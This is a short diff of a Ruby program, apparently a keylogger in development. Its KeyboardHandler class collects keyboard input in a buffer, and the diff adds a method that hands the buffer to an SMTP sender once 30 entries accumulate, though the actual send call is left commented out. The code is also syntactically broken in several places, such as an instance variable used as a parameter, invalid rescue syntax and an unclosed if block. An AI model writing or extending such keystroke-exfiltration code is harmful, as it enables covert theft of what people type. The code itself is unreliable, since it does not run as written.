@@ -14,14 +14,25 @@ class KeyboardHandler
     @buffer= one_keyboad_obj
   end
 
-  def send_buffer()
+  def send_buffer(@buffer)
+    smtp= SMTP.new()
+    
+    begin
+      smtp.init_send(@buffer)
+    rescue -> e
+      puts "#{e}: SMTP err"
+    end
+  end
+
+  def managing_buffer()
     begin
       if @buffer.size() >= 30
-        # send buffer
+        # self.send_buffer(@buffer)
         @buffer= []
     rescue -> e 
-      @buffer= []
       puts "#{e}: buffer size err"
+    ensure
+      @buffer= []
     end
   end
 end
@@ -33,5 +44,5 @@ keyboard_obj= KeyboardObj.new()
 keyboard_handler= KeyboardHandler.new(one_keyboard_obj)
 
 do
-  keyboard_handler.send_buffer()
+  keyboard_handler.managing_buffer()
 end
